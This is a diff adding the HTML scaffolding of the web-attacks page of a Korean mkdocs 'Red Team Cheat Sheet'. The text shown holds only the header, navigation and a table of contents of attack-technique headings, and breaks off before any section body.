@@ -1,0 +1,3331 @@
+
+<!doctype html>
+<html lang="ko" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="사내 레드팀/펜테스팅 업무용 치트시트">
+      
+      
+      
+      
+        <link rel="prev" href="../ad/adcs/">
+      
+      
+        <link rel="next" href="../cloud/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
+    
+    
+      
+        <title>Web 공격 - Red Team Cheat Sheet</title>
+      
+    
+    
+      <link rel="stylesheet" href="../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="red" data-md-color-accent="deep-orange">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#web" class="md-skip">
+          콘텐츠로 이동
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="상단/헤더">
+    <a href=".." title="Red Team Cheat Sheet" class="md-header__button md-logo" aria-label="Red Team Cheat Sheet" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Red Team Cheat Sheet
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Web 공격
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="red" data-md-color-accent="deep-orange"  aria-label="Light mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Light mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="red" data-md-color-accent="deep-orange"  aria-label="Dark mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Dark mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="검색" placeholder="검색" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="검색">
+        
+        <button type="reset" class="md-search__icon md-icon" title="지우기" aria-label="지우기" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            검색 초기화
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="탭" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href=".." class="md-tabs__link">
+        
+  
+  
+    
+  
+  개요
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../lifecycle/reconnaissance/" class="md-tabs__link">
+          
+  
+  
+  공격 라이프사이클
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../protocols/" class="md-tabs__link">
+          
+  
+  
+  프로토콜별 펜테스트
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../ad/ad-environment/" class="md-tabs__link">
+          
+  
+  
+  Active Directory
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+  
+  
+    <li class="md-tabs__item md-tabs__item--active">
+      <a href="./" class="md-tabs__link">
+        
+  
+  
+    
+  
+  Web 공격
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../cloud/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  Cloud 공격
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../evasion/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  방어 우회
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../infra/" class="md-tabs__link">
+          
+  
+  
+  오퍼레이션 인프라
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../tools/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  도구 레퍼런스
+
+      </a>
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="네비게이션" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href=".." title="Red Team Cheat Sheet" class="md-nav__button md-logo" aria-label="Red Team Cheat Sheet" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    Red Team Cheat Sheet
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href=".." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    개요
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    공격 라이프사이클
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    공격 라이프사이클
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../lifecycle/reconnaissance/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    외부 정찰
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../lifecycle/initial-access/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    초기 침투
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../lifecycle/enumeration/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    내부 정찰 및 열거
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../lifecycle/credential-access/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    자격 증명 탈취
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../lifecycle/privilege-escalation/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    권한 상승
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../lifecycle/lateral-movement/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    횡적 이동
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../lifecycle/persistence/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    지속성 유지
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    프로토콜별 펜테스트
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    프로토콜별 펜테스트
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../protocols/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    개요
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../protocols/smb/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SMB
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../protocols/ldap/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    LDAP
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../protocols/http/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    HTTP
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../protocols/winrm/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    WinRM
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../protocols/ssh/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SSH
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../protocols/ftp/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    FTP
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../protocols/rdp/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    RDP
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../protocols/dns/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    DNS
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../protocols/kerberos/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Kerberos
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../protocols/rpc/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    RPC
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../protocols/mssql/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    MSSQL
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../protocols/mysql/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    MySQL
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../protocols/snmp/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SNMP
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../protocols/nfs/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    NFS
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../protocols/smtp/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SMTP
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Active Directory
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Active Directory
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ad/ad-environment/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    AD 환경 공격
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ad/adcs/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    ADCS
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Web 공격
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Web 공격
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="목차">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      목차
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        정보 수집
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="정보 수집">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        기술 스택 확인
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        디렉토리 / 파일 열거
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        서브도메인 열거
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#fuzzing" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        파라미터 Fuzzing
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sql-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        SQL Injection
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="SQL Injection">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        수동 테스트
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#sqlmap" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        sqlmap
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#xss-cross-site-scripting" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        XSS (Cross-Site Scripting)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="XSS (Cross-Site Scripting)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#reflected-xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Reflected XSS
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#stored-xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Stored XSS
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#dom-based-xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        DOM-based XSS
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        필터 우회
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ssrf-server-side-request-forgery" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        SSRF (Server-Side Request Forgery)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#file-upload" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        File Upload
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#lfi-rfi-file-inclusion" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        LFI / RFI (File Inclusion)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="LFI / RFI (File Inclusion)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#lfi-local-file-inclusion" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        LFI (Local File Inclusion)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#log-poisoning-lfi-rce" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Log Poisoning (LFI → RCE)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rfi-remote-file-inclusion" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        RFI (Remote File Inclusion)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#command-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Command Injection
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ssti-server-side-template-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        SSTI (Server-Side Template Injection)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="SSTI (Server-Side Template Injection)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        탐지
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        익스플로잇
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#jwt" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        JWT 공격
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#deserialization" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Deserialization
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Deserialization">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#php" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        PHP
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#java" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Java
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#python-pickle" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Python (Pickle)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#xxe-xml-external-entity" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        XXE (XML External Entity)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="XXE (XML External Entity)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#xxe" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        기본 XXE
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#blind-xxe-out-of-band" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Blind XXE (Out-of-Band)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xxe-via-file-upload" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        XXE via File Upload
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xxe-ssrf" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        XXE → SSRF
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#csrf-cross-site-request-forgery" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        CSRF (Cross-Site Request Forgery)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#cors-misconfiguration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        CORS Misconfiguration
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#idor-access-control" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        IDOR / Access Control
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
